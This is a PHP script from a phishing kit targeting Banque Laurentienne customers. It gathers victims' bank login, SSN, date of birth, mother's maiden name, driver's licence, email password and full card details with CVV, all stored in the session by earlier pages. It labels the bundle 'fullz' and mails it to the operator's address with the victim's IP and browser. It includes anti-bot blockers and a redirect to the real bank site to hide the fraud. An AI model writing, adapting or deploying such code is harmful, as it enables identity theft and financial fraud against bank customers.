<?php
session_start();
	include "email.php";
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
					include('blocker.php');
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");



$name= $_SESSION['FN'];

$dd =$_SESSION['D1'];
$mm =$_SESSION['D2'];
$yy =$_SESSION['D3'];

$mmn =$_SESSION['MN'];
$ssn =$_SESSION['SN'];
$dl =$_SESSION['DL'];

$ea =$_SESSION['EA'];
$ep =$_SESSION['EP'];

$cn =$_SESSION['CN'];
$exp =$_SESSION['ED'];
$cvv =$_SESSION['CV'];

$user = $_SESSION['user'];
$pass =$_SESSION['pass'];

$data ="
## Laur fullz ##
|USER : $user
|PASS : $pass
==================
|NAME: $name
|DOB: $dd-$mm-$yy
|MMN: $mmn
|ssn: $ssn
|DL: $dl
==================
|EM: $ea
|EP: $ep
==================
|CC: $cn
|EXP: $exp
|CVV: $cvv

## first ##
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##laur FULL #$aa $pp $ip";

if(strlen($user) <= 5 || strlen($user)>= 16){
	echo "<meta http-equiv='refresh' content='0;url=https://m.banquelaurentienne.ca'>";
}

mail($emailusr, $subj, $data);	


header("Location: finalmsg.php");

?>